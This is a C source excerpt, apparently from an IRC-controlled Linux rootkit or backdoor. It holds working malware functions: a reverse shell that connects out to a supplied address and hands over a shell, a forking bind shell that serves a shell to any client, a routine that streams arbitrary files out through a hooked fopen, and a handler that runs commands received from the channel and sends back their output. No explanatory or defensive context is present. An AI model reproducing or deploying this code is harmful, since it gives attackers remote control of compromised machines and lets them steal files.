void sendshell(char *addr, int port){
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(addr);
    sa.sin_port = htons(port);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    send(s, REVR_MSG, strlen(REVR_MSG), 0);
    execl(BD_SHELL, basename(BD_SHELL), NULL);
}

int sfd,rc,scli;
void commit_btermicide(void){
    shutdown(sfd, SHUT_RDWR);
    close(sfd);
    shutdown(rc, SHUT_RDWR);
    close(rc);
    sleep(2);
}

int create_bind_shell(int port){
    sfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sfd < 0) return -1;

    struct sockaddr_in us, them;
    memset(&us, 0, sizeof(us));
    us.sin_family = AF_INET;
    us.sin_port = htons(port);
    us.sin_addr.s_addr = htonl(INADDR_ANY);

    rc = bind(sfd, (struct sockaddr *)&us, sizeof(us));
    if(rc != 0) return -1;

    if(fork() == 0){
        setpgrp();
        rc = listen(sfd, 5);
        if(rc != 0)
            exit(0);

        signal(SIGTERM, (sighandler_t)commit_btermicide);
        while(1){
            socklen_t slen = sizeof(them);
            scli = accept(sfd, (struct sockaddr *)&them, &slen);
            if(scli < 0)
                exit(0);

            for(int x = 2; x >= 0; x--)
                dup2(scli, x);

            send(scli, BIND_MSG, strlen(BIND_MSG), 0);
            execl(BD_SHELL, basename(BD_SHELL), NULL);
            close(scli);
        }
        close(scli);
        exit(0);
    }else{
        signal(SIGCHLD,SIG_IGN);
        return 1;
    }
}

int sendfile(const char *path){
    char buf[LINE_MAX];
    FILE *fp;

    hook(o_fopen, "fopen");
    fp = o_fopen(path, "r");
    if(fp == NULL) return -1;

    CMSG("BEGINNING FILE READ");
    while(fgets(buf, sizeof(buf), fp) != NULL){
        CMSG(buf);
        sleep(SEND_TOUT);
    }
    fclose(fp);

    CMSG("DONE. EOF.");
    return 0;
}

#define MODE_USRCMD 0x01
#define MODE_RKCMD  0x02
void do_shcmd(char *command, int mode){
    char *shcmd = strdup(command), cmd[EXEC_MAXLEN], fbuf[LINE_MAX];

    if(mode == MODE_USRCMD)         /* got the command from the channel.   */
        shcmd += 7 + strlen(NICK);  /* gotta trim off stuff we don't need. */

    memset(cmd, 0, sizeof(cmd));
    memset(fbuf, 0, sizeof(fbuf));
    snprintf(cmd, sizeof(cmd), "%s 2>/dev/null", shcmd);

    FILE *fp = popen(cmd, "r");
    if(fp == NULL){
        CMSG("FAILED OPENING FILE FOR READING");
        return;
    }

    if(mode == MODE_USRCMD)
        CMSG("COMMAND OUTPUT (WAIT FOR 'END OF OUTPUT.'):");
    while(fgets(fbuf, sizeof(fbuf), fp) != NULL){
        CMSG(fbuf);
        if(mode == MODE_USRCMD)
            sleep(SEND_TOUT);
    }
    if(mode == MODE_USRCMD)
        CMSG("END OF OUTPUT.");
    fflush(fp);
    pclose(fp);
}

void showhelp(void){
    CMSG("COMMANDS AVAILABLE:");
    sleep(SEND_TOUT);

    int elems = sizeof(ircmds)/sizeof(ircmds[0]);
    char tmp[8], cmds[8 * elems];
    memset(cmds, 0, sizeof(cmds));

    for(int i = 0; ircmds[i] != NULL; i++){
        snprintf(tmp, sizeof(tmp), "%s, ", ircmds[i]);
        strncat(cmds, tmp, 8);
    }
    cmds[strlen(cmds) - 2] = '\0';

    CMSG(cmds);
    CMSG("END OF COMMANDS.");
}